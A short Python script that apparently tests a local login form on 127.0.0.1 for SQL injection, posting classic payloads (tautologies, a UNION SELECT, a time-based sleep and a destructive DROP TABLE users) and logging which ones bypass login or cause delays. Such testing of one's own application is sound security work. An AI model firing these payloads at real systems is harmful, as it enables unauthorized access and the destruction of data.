import requests
import time
import random

url = "http://127.0.0.1:5000/"
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' AND sleep(3) --",
    "' UNION SELECT NULL, NULL --"
]

def detect_sqli():
    for payload in payloads:
        start = time.time()
        data = {'username': payload, 'password': 'anything'}
        response = requests.post(url, data=data)
        elapsed = time.time() - start

        with open("logs/sqli_logs.txt", "a") as log:
            log.write(f"[*] Payload: {payload} | Time: {elapsed:.2f}s | Response: {response.text[:50]}\n")
        
        if "Welcome" in response.text:
            print(f"[!] SQL Injection Success with payload: {payload}")
        elif elapsed > 2:
            print(f"[!] Time-based SQLi suspected with payload: {payload}")
        else:
            print(f"[-] No injection with: {payload}")

if __name__ == "__main__":
    detect_sqli()
